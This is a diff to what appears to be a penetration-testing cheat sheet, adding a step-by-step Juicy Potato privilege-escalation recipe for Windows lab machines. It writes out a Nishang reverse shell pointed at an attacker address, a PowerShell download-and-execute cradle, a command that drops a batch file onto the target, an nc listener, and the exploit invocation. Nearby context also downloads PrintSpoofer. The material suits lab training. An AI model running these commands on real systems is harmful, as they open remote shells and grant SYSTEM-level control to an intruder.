@@ -1558,6 +1558,29 @@ When psexec not working
 - See if we can upload files through shares using smbclient
 ```
 
+### Juicy Potato
+```bash
+1. First copy the Invoke-PowerShellTcp.ps1 script once again into your current directory.
+cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+mv Invoke-PowerShellTcp.ps1 shell-2.ps1
+
+2. Add the following line to the end of the script with the attack configuration settings.
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666
+
+3. Next, create a shell.bat file that downloads the above shell-2.ps1 PowerShell script and runs it.
+powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell-2.ps1')
+
+4. Then download the shell.bat file on the target machine.
+(new-object net.webclient).downloadfile('http://10.10.14.7:5555/shell.bat', 'C:\Users\kohsuke\Desktop\shell.bat')
+
+5. Setup a listener on the attack machine to receive the reverse shell.
+nc -nlvp 6666
+
+6. Then run the Juicy Potato executable.
+./jp.exe -t * -p shell.bat -l 4444
+
+```
+
 ### PrintSpoofer
 ```bash
 iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
